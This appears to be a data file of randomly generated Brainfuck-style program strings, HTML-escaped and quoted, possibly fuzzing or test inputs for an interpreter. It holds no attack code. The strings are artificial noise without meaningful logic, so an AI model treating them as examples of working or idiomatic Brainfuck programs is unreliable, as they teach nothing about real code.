&quot;+-&gt;-[&lt;[&gt;-[-.&lt;,&lt;&gt;&gt;].+,]&gt;]]+&gt;[.&gt;&lt;[.&gt;],.-[,&gt;-[[-&lt;[-&gt;,]-&lt;+]&lt;,&lt;&gt;]&lt;+&lt;]]]&lt;&gt;&gt;&lt;-+&lt;&gt;]&gt;&lt;+-&gt;&lt;,-+&gt;&lt;&lt;&gt;&gt;-+++-+&lt;&gt;-+&gt;&quot; &quot;&lt;+-++--+&gt;&lt;++-+-&lt;&gt;-+&lt;&gt;++&lt;&gt;+-&lt;&gt;+-+&gt;&lt;+-+-&gt;&lt;+&gt;&lt;&lt;&gt;-+-+-++-+&gt;&lt;+-+-++-&lt;&gt;&gt;&lt;[&gt;&lt;+-&lt;&gt;&lt;-+&gt;&lt;+--+-&gt;&lt;-&lt;&gt;-+-&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;&quot; &quot;--+-+-&gt;&lt;&gt;&lt;&gt;&gt;&lt;-+-&lt;&gt;][&gt;&gt;[++,-+&gt;&lt;&lt;]-.,]-++-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;--+-+-&lt;&gt;-++-+--&lt;&gt;&lt;&gt;&gt;&lt;-+-&lt;&gt;+-&lt;&gt;&lt;&gt;[-+-+-+&gt;&lt;&lt;&lt;&gt;+-+&quot; &quot;+-&gt;+--+&lt;&gt;[&gt;&lt;+-&gt;&lt;&gt;&lt;-+--+&lt;&gt;&lt;&gt;-+]&lt;&gt;][+[+&lt;,+[[+.[+&gt;&lt;[&lt;][&gt;&lt;++[-+[&lt;,[[.&gt;,&gt;-]&gt;&lt;+],&lt;].-+--]..],,-],&lt;+]++&gt;-]&gt;&quot; &quot;,,].&gt;.]&gt;&lt;,&gt;+-+-+-+&gt;&lt;+-+-+-+++&lt;&gt;+&lt;&gt;++-+-&gt;&lt;&lt;&gt;-++&lt;&gt;+-+-+-++-++-&gt;&lt;+-&lt;&gt;[&gt;&lt;-++-&gt;&lt;&lt;&lt;&gt;-+---+---+&gt;&lt;&gt;&lt;+-&gt;&lt;-&gt;&lt;+&quot; &quot;--+--+&lt;&gt;+---+-+&gt;&lt;-+-+--&lt;&gt;&gt;&lt;-+&gt;&lt;--++-&gt;&lt;-&gt;&lt;+-+-+-&gt;-+&gt;&lt;-&gt;&lt;&lt;&gt;]&lt;&gt;&gt;&lt;&gt;&lt;&lt;-++-+-&gt;&lt;+--+--+-+&gt;&lt;-[&gt;&lt;&lt;-++&gt;&lt;&gt;&gt;&lt;&lt;&gt;+&quot; &quot;-&gt;&lt;&gt;&lt;[&gt;&lt;-+--+]+-][+.[--,&gt;-++],]-+&lt;&gt;-++-,-+&lt;&gt;+-&lt;&gt;&gt;&lt;&gt;&lt;&gt;+-&lt;&gt;&gt;&lt;-+++&gt;&lt;&lt;&gt;+-+&lt;&gt;+-&lt;&gt;+-+&gt;&lt;-+&gt;&lt;+-+&lt;&gt;+-++++-[&lt;-&quot; &quot;+-+--++--+--+-+&gt;&lt;--&gt;&lt;+-&gt;&lt;-+--+--+-+&gt;+---+&gt;&lt;+-][,.-[.,+[+-&lt;[,[,+[.&gt;[-&gt;+[[+[-&gt;&lt;],[--+,-]&gt;&lt;-][.+,&lt;[,+.&gt;&quot; &quot;..]]]]+.-,-]&lt;,+-]&lt;&gt;&gt;[+[[,-.-+,].+]&lt;+.]-,&lt;]+&gt;]-[[&lt;[&lt;.,&lt;+,][&lt;-+[-[&lt;&lt;&gt;[&gt;+&lt;&lt;++&lt;]-+],]+-]],,-&gt;-]&lt;&lt;&gt;]&gt;+&lt;]+&quot; &quot;-&lt;&gt;+-&lt;&gt;&lt;&gt;&lt;+--&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;--+-&lt;&gt;+-+-&gt;&lt;&gt;&lt;--&lt;&gt;-++--+--+-[+--+-+&lt;&gt;&lt;&lt;&gt;&lt;&gt;-++&lt;&gt;-++--+&lt;&gt;&gt;[+-+--+&lt;&gt;-+-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;&gt;&lt;]&quot; &quot;&gt;&lt;]&gt;&lt;,&gt;&lt;&gt;+-&lt;&gt;&gt;&lt;&lt;&gt;++-+&gt;&lt;-+&lt;&gt;+-++-+&lt;&gt;-+&lt;&gt;++--+&gt;&lt;-+[+-+-&lt;&gt;&gt;&lt;&lt;&lt;&gt;&gt;&lt;-++---++--+-+-&gt;&lt;-+-&gt;&lt;-&lt;&gt;+-&gt;&lt;--+-&gt;&lt;&gt;&lt;&lt;&gt;&quot; &quot;--+&lt;&gt;&lt;&gt;&gt;&lt;-&lt;&gt;&lt;&gt;&lt;&gt;-++--+-&gt;&lt;-&gt;&lt;-+--+-&gt;&lt;-&gt;&lt;+--&lt;&gt;&gt;&lt;--++--&lt;&gt;&gt;&lt;-+&gt;&lt;+----++-&gt;&lt;&lt;&gt;&gt;&lt;-+-&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;--+&gt;&lt;&lt;&gt;&lt;&gt;&gt;-&lt;&gt;-+&quot; &quot;&gt;&lt;]-+-+&lt;&gt;&lt;+--+-+&lt;&gt;[&gt;&lt;+-&lt;&gt;&lt;+-&gt;&lt;-++-+&lt;&gt;+-&lt;&gt;&gt;+-&lt;&gt;&gt;&lt;&lt;&gt;[--+-++-+-&lt;&gt;]&lt;&gt;-+&gt;&lt;&gt;&lt;][.+.+],+-&gt;&gt;&lt;&gt;&lt;&gt;&lt;-+&lt;&gt;++&gt;&lt;&gt;&lt;+-&quot; &quot;+-+&gt;&lt;&gt;&lt;-+++-+-+-&gt;&lt;+&gt;&lt;-+-+&gt;&lt;-+++-++-+-&lt;&gt;+&gt;&lt;+-+-&gt;&lt;&gt;&lt;+&lt;&gt;&gt;&lt;+&lt;&gt;[&lt;&gt;-+&lt;&gt;&lt;&gt;&lt;--&gt;&lt;&lt;&gt;&gt;&lt;-+--+-&lt;&gt;-+-&lt;&gt;&lt;&gt;&lt;&gt;&gt;-++--+&quot; &quot;-&gt;&lt;][&gt;-,[&gt;.+&lt;--]&lt;.[+[&lt;&lt;[&lt;[--&lt;[&gt;&lt;-&lt;],.[[-&gt;,.],&gt;&gt;]&lt;.+].+-,]++]+[&gt;,[-+[[[+-&lt;&gt;&gt;&lt;.]&lt;-].-,]+-,]]&gt;]&gt;]+-&lt;+-&lt;&quot; &quot;&gt;-+-+--+&gt;&lt;-[&gt;&lt;-++-&lt;-+&lt;&gt;-++-++-&gt;-+&lt;&gt;[+--+-&gt;&lt;&lt;&gt;][++--[.,&gt;+--[.&lt;,[&gt;,[,[[-&gt;[[[--&gt;--.]&gt;+-,-]&gt;.&gt;]],[.&gt;[-+,&quot; &quot;[&lt;.,&gt;[+&lt;&gt;,,+&lt;&lt;.],+]]--[+.&gt;&lt;,[&gt;-,[+,]--&gt;]+.].,&lt;]]+]++].[&lt;+.].,+].&gt;-],+]&gt;&lt;&lt;&gt;]&gt;&lt;&lt;&gt;,&gt;&lt;&lt;&gt;&gt;&lt;&gt;+-+-+&lt;&gt;&lt;&gt;++-+&quot; &quot;&gt;&lt;-+&gt;&lt;+-++--++&gt;&lt;-++-&gt;&lt;+&lt;&gt;&lt;&gt;&gt;&lt;-++-+&lt;&gt;+[&lt;&gt;&lt;+--+-&gt;&lt;-+-&gt;&lt;-+---+-+--++--&gt;&lt;-+-&lt;&gt;&lt;&gt;-+&gt;&lt;-+--+&gt;&lt;-+-+-&lt;&gt;-&gt;&lt;-++&quot; &quot;-&gt;&lt;-+--+-&gt;&lt;&gt;--+]&lt;+-&lt;&gt;&lt;&gt;-&lt;&gt;-+&gt;&lt;&lt;&gt;-+-&lt;&gt;--++-[&gt;&lt;-+&gt;&lt;&gt;&lt;&lt;&gt;&lt;&gt;&lt;+&gt;&lt;&lt;&gt;+-&gt;&lt;&gt;+-+-[-++-&lt;&gt;&lt;&gt;-+-+--+]+-&lt;&gt;&gt;&lt;&lt;&gt;],&gt;&lt;+&quot; &quot;-&gt;&lt;-+-+&gt;+&gt;&lt;+-&lt;&gt;-++&lt;&gt;++--++-++-+&gt;&lt;&gt;&lt;&lt;&gt;+-++-&lt;&gt;[&lt;&gt;+-&lt;&gt;&lt;-+-&gt;&lt;-+&lt;&gt;&gt;&lt;-+--+&gt;&lt;&lt;&gt;---&gt;&lt;+--+&lt;&gt;&gt;&lt;--+&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;-&gt;&lt;&gt;&quot; &quot;&lt;+--&lt;&gt;-+-&gt;--+&gt;&lt;+-&gt;&lt;]+--+&gt;&lt;&lt;&lt;&gt;--+-+-+-+--+&gt;&lt;-+&gt;&lt;-&lt;&gt;-+[&lt;&gt;&gt;&lt;-+&lt;&lt;&gt;-++&lt;&gt;&lt;&gt;&lt;&gt;-+&gt;[-+-&gt;&lt;+--+][[-&gt;&gt;[+&lt;.[&gt;&gt;-].&quot; &quot;&lt;,&lt;],]-+&lt;]&gt;&lt;]&lt;&gt;&lt;&gt;&lt;&gt;+--+,&gt;&gt;&lt;-+&lt;&gt;+--+++-+-+-+&gt;&lt;+-&gt;&lt;+-+-++-&gt;&lt;+&lt;&gt;+-+-+-+-+-+&lt;&gt;+-+-+-+&lt;&gt;++&lt;&gt;&lt;&gt;-+[&gt;&lt;&lt;&gt;+-&lt;&lt;&quot; &quot;&gt;&gt;&lt;&lt;&gt;+--+--&lt;&gt;+-+--+-&lt;&gt;+-&lt;&gt;-+-+-&lt;&gt;-&gt;&lt;&gt;&lt;-&gt;&lt;&lt;&gt;+-&lt;&gt;&gt;+-&lt;&gt;-+-][&lt;-++&lt;.-&gt;]&lt;&gt;+-&gt;&lt;&gt;&lt;-+&lt;+-+-[&lt;&lt;&gt;-++--++&lt;&gt;&gt;&lt;&gt;&gt;&lt;&lt;&quot; &quot;&gt;-+[&gt;&lt;-++-+--+-+-&lt;&gt;+--+][[&lt;+,[&gt;&lt;+.]+]+.[&lt;[.-&gt;&lt;]-+&gt;-],]&gt;&lt;+-&gt;&lt;-++-]&gt;&lt;&gt;&lt;,&lt;&gt;&lt;&gt;&lt;&gt;&gt;++-+-+-&lt;&gt;+-+-++-++-+-&gt;&lt;&quot; &quot;+-++--++-+-+[+-+-+--++-&lt;-&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&lt;&gt;--+&gt;&lt;--&gt;&lt;-++--+-&lt;&gt;+--+-+-&gt;&lt;&lt;&gt;+-&gt;&lt;-+-&lt;&gt;&lt;&gt;+-+--&gt;&lt;-+-&lt;&gt;-+-+-&lt;&gt;-&gt;&lt;&gt;-+&quot; &quot;-]-+&lt;-&lt;&gt;-+-+[&gt;&lt;&gt;&lt;+-&lt;+-+&lt;&gt;&gt;+-&gt;&lt;&lt;&gt;-+[+-&gt;&lt;&gt;&lt;+--]]-+-+&gt;&lt;-+-+,+-&gt;&lt;&gt;+--++-+&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;+&lt;&gt;&gt;&lt;++-+&lt;&gt;+-++-+[&gt;&lt;&lt;&gt;+&quot; &quot;-&lt;-+&lt;&gt;-&lt;&gt;&lt;&gt;-++-&gt;&lt;-&lt;&gt;&lt;&gt;+--+--+&lt;&gt;+--++--+-&lt;&gt;&lt;&gt;&lt;&gt;--+&lt;&gt;-++---+-&gt;&lt;-&lt;&gt;+-&gt;-+-&lt;&gt;&lt;&gt;][[--,[&lt;&lt;-[&gt;[,&gt;.[.,-[.+[&lt;,&quot; &quot;&lt;-.[-+-],]&gt;]++.],&gt;&lt;],,,]&lt;.-+,].&lt;]-[&gt;+-[.-&lt;,],,.[&lt;[&lt;-,--+-++]+-.+]-]&lt;-+]&lt;&gt;-+&lt;-&lt;&gt;+-+--+-+--+--++--[&lt;&gt;-&quot; &quot;+&gt;&lt;&gt;&lt;&lt;++-&lt;&gt;+-&gt;&lt;&gt;&gt;&lt;-+[+-&gt;&lt;-+&gt;&lt;&gt;&lt;-][+--.&lt;]+--+&lt;&gt;&gt;&lt;&gt;&lt;]-++-,+-&gt;-++-&lt;&gt;&gt;&lt;&lt;&gt;+++&gt;&lt;+-+-+&lt;&gt;+++-+++&gt;&lt;+-&gt;&lt;&gt;&lt;&lt;&gt;[-&quot; &quot;+&lt;&gt;&gt;&lt;&lt;&lt;&gt;+--+-+---+-+&lt;&gt;-+-&lt;&gt;&gt;&lt;&gt;&lt;--&lt;&gt;+-&gt;&lt;-&lt;&gt;-+-+&gt;&lt;-&gt;&lt;&gt;&lt;+-+-&lt;&gt;--++-&lt;&gt;&lt;&gt;---+-&gt;+--+-++--+-&lt;&gt;-+&lt;&gt;+-]&gt;&lt;-+&lt;+&quot; &quot;-&gt;&lt;-&gt;&lt;+---+&gt;&lt;+-[&lt;-++&lt;&gt;&gt;&lt;+-+-&gt;&gt;&lt;&gt;&lt;[-+-+-]][[[&gt;&gt;+[.]&gt;++-]]-.]&lt;&gt;&gt;&lt;,&gt;&lt;&lt;&gt;-+-+&gt;&lt;&gt;-+&lt;&gt;&lt;&gt;+&lt;&gt;&gt;&lt;++-+-+-&gt;&lt;&lt;&gt;+&gt;&lt;&quot; &quot;+-+&gt;&lt;+&lt;&gt;+-+&gt;&lt;+-&gt;&lt;+&lt;&gt;-++&gt;&lt;-++-[-+-+&lt;&gt;&lt;-+---++---&lt;&gt;-&lt;&gt;-+&lt;&gt;&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;-&gt;&lt;&lt;&gt;&gt;&lt;-+-+---+&lt;&gt;&gt;&lt;--+-+-+-&gt;&lt;&gt;&lt;+-+-&quot; &quot;-+-&gt;&lt;+-&gt;&lt;&gt;&gt;&lt;&lt;&gt;-++-&lt;&gt;-&gt;&lt;&lt;&gt;+-&gt;&lt;&lt;&gt;]+--+&lt;&gt;&lt;+---+-&gt;&lt;&lt;&gt;-++----+-+&gt;&lt;--+-+&lt;&gt;+---+&lt;&gt;&gt;&lt;&gt;&lt;-+[+--+-+-+&gt;&lt;&lt;+&gt;&gt;&lt;&gt;&lt;[&quot; &quot;-+&lt;&gt;-+&gt;&lt;+--+-+-]-++-+-][&gt;-[.+&lt;[&lt;-+&gt;.]+.&lt;[[&gt;,[[+.+&gt;]-&lt;.]+-+[+,&gt;,&gt;-,+-]]]]&gt;,-[&gt;-&lt;[-,&lt;-&gt;[&lt;.&gt;[+.[.-+]&gt;,[&quot; &quot;,[.-]&gt;]&gt;]+&gt;[[&gt;-,]+-+].]],&lt;[&lt;&lt;..-&gt;&lt;].]]-+,-+&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+-+&lt;&gt;&gt;&lt;-++-+&lt;&gt;+-&lt;&gt;+&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+-++-&gt;&lt;-+&gt;&lt;-++++&gt;&lt;+-+&quot; &quot;&gt;&lt;&lt;&gt;&lt;&gt;+-+-+&lt;&gt;+-++-+-&lt;&gt;&lt;&gt;[-+&lt;&gt;&gt;&lt;&gt;&lt;-+&lt;&lt;&gt;+--&lt;&gt;&lt;&gt;-+-+---+-+--&lt;&gt;&lt;&gt;&gt;&lt;&lt;&gt;-+&gt;+-&lt;&gt;+-&lt;&gt;-&lt;&gt;&lt;&gt;&gt;&lt;][[.[&gt;&gt;-[.&gt;.[[..[&quot; &quot;+,,]&lt;.&gt;[..&lt;&gt;+..]+&lt;]&lt;&gt;]+-]&gt;&gt;&gt;[[--,-],+&gt;.-]-.]&gt;]+-]&lt;-+-[+-&lt;&lt;&gt;&gt;&lt;&gt;&lt;+&gt;+-[-+&lt;&gt;&lt;&gt;&lt;&gt;-+-&lt;&gt;+-+-+-]&gt;&lt;+-+-&lt;&gt;],&gt;&lt;&quot; &quot;+--+&gt;-+&gt;&lt;+-&lt;&gt;++-++-+&gt;&lt;-+++-+-&gt;&lt;+&gt;&lt;-++-&lt;&gt;+&gt;&lt;&lt;&gt;+-&lt;&gt;-+++-&lt;&gt;&gt;&lt;+&gt;&lt;&lt;&gt;&gt;&lt;+-+&gt;&lt;-+&lt;&gt;-+[&lt;&gt;&lt;-&lt;&gt;-+-+-&gt;&lt;&gt;&lt;+--+--+&gt;&quot; &quot;&lt;-+-+-+-&lt;&gt;&gt;&lt;+-+--&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;+-&gt;-++---+-++-][,[.[...&lt;,&lt;&lt;+,]]-.]+-&lt;&gt;-+-+&lt;&gt;&lt;-+&lt;&gt;&gt;&lt;&lt;&gt;-&gt;&lt;-&lt;&gt;+-&gt;&lt;---&lt;&gt;--&lt;&gt;-+-&quot; &quot;++-+--[&gt;&lt;&lt;++-+--+-++-&gt;-+&gt;&lt;-+&gt;&lt;+-[-+-]]+-&lt;&gt;,+-+-&gt;++-+-&gt;&lt;-+&gt;&lt;+&lt;&gt;&gt;&lt;&gt;&lt;-+-++&lt;&gt;&gt;&lt;&lt;&gt;+&lt;&gt;&gt;&lt;-++&lt;&gt;-+&gt;&lt;+++-&gt;&lt;+-+&quot; &quot;-&gt;&lt;+&lt;&gt;+-+&lt;&gt;&lt;&gt;+&lt;&gt;&lt;&gt;[+-&gt;&lt;&lt;-+&lt;&gt;+-&lt;&gt;-&gt;&lt;&gt;&lt;&lt;&gt;-+&gt;&lt;-&gt;&lt;--+-&lt;&gt;&lt;&gt;-+-+-&gt;&lt;&gt;+-&gt;&lt;&lt;&gt;--+&gt;&lt;+-&lt;&gt;-+][[,.-,.]]+-&gt;&lt;-+&lt;&lt;&gt;+-&quot; &quot;&gt;&lt;&lt;&gt;&lt;&gt;-+-&gt;&lt;--+---+-++--&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;&lt;&gt;--++--+-&lt;&gt;-+&lt;&gt;&lt;&gt;[&lt;-+&lt;&gt;&lt;&gt;&lt;&gt;+&gt;-+&gt;&lt;&gt;&lt;&lt;&gt;-+[-&gt;&lt;-+]&lt;&gt;&lt;&gt;&lt;&gt;+-&gt;&lt;][..,[,.[-&gt;&lt;&quot; &quot;.&lt;]-,[[&lt;&gt;&gt;[&gt;[&gt;,&lt;[&gt;&gt;+,[+[[-,-+]&lt;]&gt;,[++[&lt;,&gt;&gt;+-&lt;][&gt;],&gt;]-&gt;&gt;].],&lt;],+.,]-,[-[&gt;,,+][+[[&lt;&gt;],&lt;&gt;]].-]-&gt;,]]&lt;+&gt;]&quot; &quot;+[&gt;&lt;&gt;+.&gt;&lt;]-]&lt;&gt;-+&gt;&lt;+-,+-+--+-+&gt;&lt;&gt;+-+&gt;&lt;-+&gt;&lt;+&gt;&lt;-++-&gt;&lt;+-+-++--++++--++&gt;&lt;-++-++&gt;&lt;&lt;&gt;-+-+-+[-+-+&lt;&lt;&gt;-&gt;&lt;&gt;&lt;+-&gt;&quot; &quot;&lt;&lt;&gt;-+-&gt;&lt;+--+-+--+&lt;&gt;&lt;&gt;--+&gt;&lt;+-+-&lt;&gt;-&gt;&lt;&lt;&gt;-&lt;&gt;+-&lt;&gt;+--+---+&lt;&gt;&lt;&gt;+--&lt;&gt;+--+-&lt;&gt;--+&lt;&gt;-+-&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;+--&gt;&lt;&gt;&lt;&quot; &quot;-+&gt;&lt;][&gt;+&gt;--]&gt;&lt;-+-+&lt;-++--+-&gt;&lt;&gt;&lt;--+-&lt;&gt;+-&lt;&gt;-++-[-++-&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;+&lt;&gt;&gt;[-+&gt;&lt;&gt;&lt;-+-+-&gt;&lt;-+-++-]&gt;&lt;&lt;&gt;][,,+-&gt;-+]&lt;&gt;&lt;&quot; &quot;&gt;-+-+,+-&lt;&gt;-+-+-+&gt;&lt;&gt;+-&gt;&lt;+&gt;&lt;+-+-+&gt;&lt;+&lt;&gt;&gt;&lt;++-&lt;&gt;&lt;&gt;+-+-+&gt;&lt;+--++-++-++-++-+[&lt;&gt;&lt;&gt;&lt;&gt;&lt;+--+-&lt;&gt;+---&lt;&gt;&lt;&gt;-+&lt;&gt;-&gt;&lt;--&quot; &quot;+&gt;&lt;&lt;&gt;+-&lt;&gt;&gt;&gt;&lt;-+-+-&lt;&gt;-+]-+&lt;&gt;+-+-+-&lt;--+&lt;&gt;--&gt;&lt;-+&lt;&gt;--&lt;&gt;+-&lt;&gt;&lt;&gt;-&gt;&lt;&lt;&gt;+-[-+&lt;-++--+&lt;&gt;+&lt;&gt;-+&gt;&lt;&gt;&gt;&lt;-+&lt;&gt;&lt;&gt;[-+&lt;&gt;&gt;&lt;+-&quot; &quot;-+-+--+&lt;&gt;]&lt;&gt;]+--+,&gt;&gt;&lt;-+&gt;&lt;+&lt;&gt;&gt;&lt;+&gt;&lt;++-+&lt;&gt;+-&gt;&lt;++--++&lt;&gt;&lt;&gt;[&gt;&lt;+--+&lt;&gt;&lt;&lt;&gt;--+&lt;&gt;&gt;&lt;-&gt;&lt;&lt;&gt;&lt;&gt;+-&gt;&lt;-+-&lt;&gt;-&lt;&gt;-+-+-+--+&quot; &quot;-+-+---+-++--&lt;&gt;&lt;&gt;&gt;&lt;-+---+&gt;&lt;-+&gt;&lt;&lt;&gt;-&lt;&gt;-+&gt;&lt;&lt;&gt;--+---&gt;&lt;&lt;&gt;-&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;-&lt;&gt;+-]&lt;&lt;&gt;&gt;&lt;+--&gt;&lt;---&lt;&gt;&gt;&lt;+--+[+-&lt;&gt;&gt;&lt;&lt;+&quot; &quot;&gt;&lt;-+&lt;&gt;&lt;&gt;&gt;&gt;&lt;-+&gt;&lt;-+[-+--+&gt;&lt;+-]&gt;&lt;][[[-+,.],.,-].&lt;,[&lt;,+[&gt;...[&lt;&lt;,[+[,&gt;&gt;[+.-[.+[[&lt;,+][,&lt;,+-&gt;&lt;]&lt;&gt;].,,&gt;][&gt;,.&quot; &quot;.]+&lt;]-+],,]]&lt;]+,.]]+-+-&lt;&gt;+-,+-+-&gt;&lt;&gt;&lt;&gt;&lt;&gt;+&gt;&lt;&gt;&lt;+-++-+-++&gt;&lt;&gt;&lt;+-&gt;&lt;&lt;&gt;++-&lt;&gt;++-&gt;&lt;-++-+-[&gt;&lt;&lt;&gt;+-&lt;+-+-+-&gt;&lt;+----&quot; &quot;-+-+---+-+--++--&lt;&gt;+-&gt;&lt;&gt;&lt;-+-&gt;&lt;+----+&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;--+--&gt;&lt;--+-+&gt;&lt;-+-&lt;&gt;+-&gt;&lt;-+-+-&gt;-]&gt;&lt;&gt;&lt;-+&lt;&lt;&gt;+--+-&lt;&gt;&lt;&gt;--+-+-++&quot; &quot;---++--+-+-&lt;&gt;+-&lt;&gt;&gt;&lt;-+-&lt;&gt;[&lt;&gt;&gt;&lt;&lt;&gt;&lt;-+&lt;&gt;+--+++-&gt;&lt;&gt;&lt;&gt;[-+-+-&gt;&lt;][&lt;.[&lt;&gt;[.[,-,[.,,]&lt;-+[&gt;[.[,[-[[.&gt;&lt;][-&gt;+&lt;].&gt;]&quot; &quot;&gt;&lt;&gt;[[&gt;&lt;,]-.&lt;[&lt;,+..]]+&gt;-]&gt;&gt;[&lt;[-.&gt;-&lt;[+&lt;+&gt;,].&lt;]&lt;[--[&gt;-]],]&gt;]&gt;&gt;[[&gt;.+++]-+++.]].,&gt;-&lt;]&gt;+]&gt;&lt;+]&lt;&gt;-[+++[,,&lt;[,&quot; &quot;..-[..-]&gt;-],],+]+]+[+&gt;[&lt;&gt;+-.-[+[.+-]+&gt;&gt;&lt;&lt;-]],]&lt;]+-&gt;&lt;-+&lt;&gt;][.[,,-&gt;+&lt;],-+]-+,&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;-++&gt;&lt;-++-+-&gt;&lt;++&lt;&gt;&quot; &quot;+-&lt;&gt;++-++-++-+&lt;&gt;[+-+-&lt;&lt;&gt;-&gt;&lt;+--+--+--+&lt;&gt;+--&gt;&lt;-+&lt;&gt;--+-+-&gt;&lt;&lt;&gt;-+-&lt;&gt;&gt;&lt;+--+&gt;-++---+][&lt;+&lt;+]&lt;&lt;&gt;&gt;&lt;-&gt;&lt;&gt;&lt;&lt;&gt;-+-+&quot; &quot;-&gt;&lt;+-+-[&gt;&lt;&lt;&gt;&lt;+--+&lt;&gt;-++&lt;&gt;+-&gt;[+-+-+-+--&lt;&gt;-+-+&lt;&gt;-+]&lt;&gt;+-&lt;&gt;-+]&lt;&gt;-++-,&gt;&lt;&lt;&gt;&lt;&gt;&gt;+-+-++&gt;&lt;&lt;&gt;+--++-+-+&gt;&lt;++[-++-&lt;&quot; &quot;-+-+&gt;&lt;-+-+-&lt;&gt;&lt;&gt;--+&lt;&gt;+--++--&gt;&lt;+--+--+&lt;&gt;&lt;&gt;+-+---++-&lt;&gt;&gt;&lt;&gt;&lt;----&gt;&lt;--++-&gt;-+&lt;&gt;-+-+-&lt;&gt;]&gt;&lt;&lt;&gt;-+&gt;&lt;&lt;&gt;&lt;+-&gt;&lt;-&lt;&gt;[-+&quot; &quot;+-+-&lt;+--++-++-&gt;[-+-&gt;&lt;&gt;&lt;-+]&gt;&lt;-+][+&gt;[+&lt;,[+[,+[,&lt;&lt;,+,]&lt;.],-&gt;]+&gt;]-]+--+-++-,+--+&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&lt;&gt;-+++-++-&gt;&lt;&lt;&gt;&lt;&quot; &quot;&gt;&lt;&gt;+&gt;&lt;&lt;&gt;&lt;&gt;++-++-&lt;&gt;&gt;&lt;+--+++-&gt;&lt;+-+-++-&gt;&lt;+-+&lt;&gt;&lt;&gt;+-+&lt;&gt;&gt;&lt;[&lt;&gt;&lt;&gt;&lt;&lt;&gt;-&gt;&lt;+-&gt;&lt;+---&gt;&lt;-+-+--&lt;&gt;&gt;&lt;&gt;&lt;--+-+-+----&gt;-]+&quot; &quot;-&lt;&gt;&lt;&lt;&gt;&lt;&gt;--+&gt;&lt;+-&gt;&lt;&gt;&lt;--++-+-&gt;&lt;--&lt;&gt;--+-+&gt;&lt;&lt;&gt;--+&gt;&lt;&gt;&lt;-[&lt;&lt;&gt;&lt;&gt;&lt;&gt;+-+&gt;&lt;&gt;[-]&lt;&gt;&gt;&lt;-+][.-&gt;[[&lt;.-.&gt;].+[,[&lt;[,&lt;-[.&gt;+-&quot; &quot;],.&gt;+&lt;]+[[[,]],&lt;+++]&gt;-]&lt;-]&gt;+&lt;].&lt;&lt;[&lt;&gt;-,&gt;&gt;]],+-&gt;&lt;&gt;-++-+-+&lt;&gt;&lt;&gt;+-+++-+++-[&lt;&gt;&gt;&lt;&lt;&lt;&gt;+--&lt;&gt;&lt;&gt;-&gt;&lt;--+-++-&gt;&lt;&lt;&gt;-+&quot; &quot;-&lt;&gt;-+-+&lt;&gt;--&gt;&lt;&gt;&lt;-+-&gt;&lt;&lt;&gt;-+&lt;&gt;&lt;&gt;-&lt;&gt;&gt;&lt;&gt;&lt;-+&lt;&gt;-+-&gt;&lt;&lt;&gt;&lt;&gt;-+--+-+&gt;&lt;-+&gt;&lt;-+-&gt;&lt;&lt;&gt;&gt;+--&gt;&lt;&gt;&lt;+-]&gt;&lt;&lt;+--[-+-+&lt;&gt;-+&lt;+--++&quot; &quot;-&gt;&lt;+-+&gt;&lt;&lt;&gt;-+&lt;&gt;+-&gt;&lt;&gt;&gt;&lt;-+&lt;&gt;[-+&lt;&gt;-&lt;&gt;&lt;&gt;-+&gt;&lt;][,-+&gt;---]&lt;&gt;-++-+-&gt;&lt;][,-],&gt;&lt;-+-+&gt;+-++--+&gt;&lt;+&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;+-++-++-&lt;&gt;&quot; &quot;+-+-&lt;&gt;+&gt;&lt;++--+++[&gt;&lt;-+&lt;&gt;-+-+&lt;&gt;&lt;-+-+-+-&gt;&lt;-&lt;&gt;&lt;&gt;&lt;&gt;-&gt;&lt;-+&gt;&lt;-&lt;&gt;-&gt;&lt;&gt;&lt;+-+-&gt;&lt;-&lt;&gt;+--+-+--&lt;&gt;&lt;&gt;&lt;&gt;-+&lt;&gt;-+-&gt;&lt;+-&gt;&lt;&lt;&gt;-&quot; &quot;+--+---+-+&gt;&lt;+-&gt;&lt;&gt;+--+-&gt;&lt;-+-+-+]&lt;+-+-+---&gt;&lt;&gt;&lt;-+--++--&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;-+-&gt;&lt;-+[&lt;-+-++-+&gt;&lt;&lt;&gt;&gt;-++-&lt;&gt;[&gt;&lt;&gt;&lt;+-+---&quot; &quot;+][.-[[.,-[&gt;&lt;&gt;[&lt;&gt;,.+]-+&gt;],&gt;,[,&gt;-[+&lt;+[[,-+,[&gt;[&lt;+[+&lt;+,]&gt;-.[-.-.]&lt;.-]++]&gt;&lt;,]&gt;&gt;[[.-,+&gt;]+&lt;-]]&gt;+],.]]--&gt;,-&quot; &quot;]+&lt;.&lt;]-+&lt;&gt;+-&gt;&lt;]+-+-,-+-+&gt;&lt;+-&gt;-+&lt;&gt;+&lt;&gt;+&lt;&gt;+-&lt;&gt;+-+&gt;&lt;&lt;&gt;&lt;&gt;+&lt;&gt;-++-++--++-&lt;&gt;+&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;+&gt;&lt;+&lt;&gt;+-+&gt;&lt;+-+&lt;&gt;[&gt;&lt;&gt;&lt;&quot; 